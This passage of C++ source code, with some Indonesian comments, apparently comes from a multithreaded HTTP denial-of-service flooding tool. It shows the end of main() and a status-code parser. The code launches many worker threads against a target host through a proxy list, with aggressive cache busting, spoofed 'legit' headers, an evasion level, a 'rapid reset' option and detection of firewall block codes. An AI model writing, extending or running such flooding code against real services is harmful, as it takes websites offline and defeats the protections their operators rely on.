    log_info_global(-1, "Cache busting: Aggressive (random query param + no-cache headers)");
    if (add_extra_headers_cli) {
        log_info_global(-1, "Extra legit headers: Enabled");
    } else {
        log_info_global(-1, "Extra legit headers: Disabled");
    }


    std::vector<std::thread> threads;
    std::atomic<bool> stop_flag(false);

    for (int i = 0; i < num_threads; ++i) {
        threads.emplace_back(
            worker_thread_function,
            parsed_host,
            parsed_path, 
            parsed_port,
            shared_ssl_ctx, 
            std::ref(proxies_list), 
            i, 
            rps_per_thread_ignored, 
            std::ref(stop_flag),
            custom_user_agent, 
            custom_cookie, 
            chosen_platform_for_run, 
            add_extra_headers_cli, 
            rapid_reset_cli, 
            evasion_level_cli, 
            std::ref(parsed_waf_codes), 
            i 
        );
    }

    log_info_global(-1, "All threads started. Running for " + std::to_string(duration_seconds) + " seconds...");
    std::this_thread::sleep_for(std::chrono::seconds(duration_seconds));

    log_info_global(-1, "Time up. Signaling worker threads to stop...");
    stop_flag.store(true, std::memory_order_relaxed);

    for (auto& t : threads) {
        if (t.joinable()) {
            t.join();
        }
    }

    log_info_global(-1, "All worker threads finished.");

    if(shared_ssl_ctx) {
        SSL_CTX_free(shared_ssl_ctx);
    }
    cleanup_openssl();

    log_info_global(-1, "Program finished.");
    return 0;
}

// Definisi fungsi parse_status_codes
std::vector<int> parse_status_codes(const std::string& codes_str) {
    std::vector<int> codes;
    std::string s = codes_str;

    // Hapus spasi
    s.erase(std::remove_if(s.begin(), s.end(), ::isspace), s.end());

    // Hapus kurung siku jika ada
    if (!s.empty() && s.front() == '[') s.erase(0, 1);
    if (!s.empty() && s.back() == ']') s.pop_back();

    if (s.empty()) return codes; // Kembalikan vektor kosong jika string menjadi kosong

    std::stringstream ss(s);
    std::string item;
    while (std::getline(ss, item, ',')) {
        if (item.empty()) continue; // Abaikan item kosong (misalnya, dari ",,")
        try {
            codes.push_back(std::stoi(item));
        } catch (const std::invalid_argument& ia) {
            log_error_global(-1, "Invalid status code in --waf-codes: " + item);
        } catch (const std::out_of_range& oor) {
            log_error_global(-1, "Status code out of range in --waf-codes: " + item);
        }
    }
    return codes;
}
